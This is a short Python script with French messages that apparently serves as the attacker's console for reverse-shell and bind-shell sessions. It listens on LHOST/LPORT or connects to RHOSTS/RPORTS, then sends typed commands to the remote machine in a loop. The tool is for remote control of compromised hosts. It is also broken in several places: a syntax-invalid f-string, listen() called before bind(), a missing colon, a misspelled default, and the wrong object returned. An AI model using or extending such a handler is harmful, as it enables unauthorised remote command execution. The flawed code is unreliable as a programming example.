from colorama import init, Fore
import socket
import time

init(autoreset=True)

def connect(parametres, kind='reverse-shell'):
    kinds = ['reverse-shell', 'bind-shell']
    if kind not in kinds:
        print(f'Veillez choisir entre : {for i in kinds}')
        return -1

    connection = socket.socket()

    if kind == 'reverse-shell':
        if (parametres.get('LHOST') or parametres.get('LPORT')) is  None:
            print(Fore.RED+'[+] Veillez specifié LHOST et LPORT')
            return -1
        connection.listen(1)
        connection.bind((parametres['LHOST'], parametres['LPORT']))
        print(Fore.RED+'[+] En attente sur {0} port {1}'.format(parametres['LHOST'], parametres['LPORT']))
        connection.accept()
        return connection

    elif kind == 'bind-shell':
        try:
            connection.connect((parametres['RHOSTS'], parametres['RPORTS']))
            return connect
        except ConnectionError:
            print(Fore.RED+'[-] Connection Indisponible sur {0}:{1}'.format(parametres['RHOSTS'], parametres['RPORTS']))
            return -1


def shell(parametres, kind='reerse-shell')
    connection = connect(parametres, kind=kind)
    commande = ''

    while True:
        msg = connection.recv(10 ** 9).decode()
        print(msg)
        commande = input('$ ')
        if commande == 'exit':
            rep = input(Fore.RED+'[+] Voullez vous gardez les shell en arrière plan [O/N] (defaut:O) ? : ')
            if rep == ('' or 'O'):
                print(Fore.RED+'[+] Success')
                return connection
        connection.send(commande.encode())
        time.sleep(1)

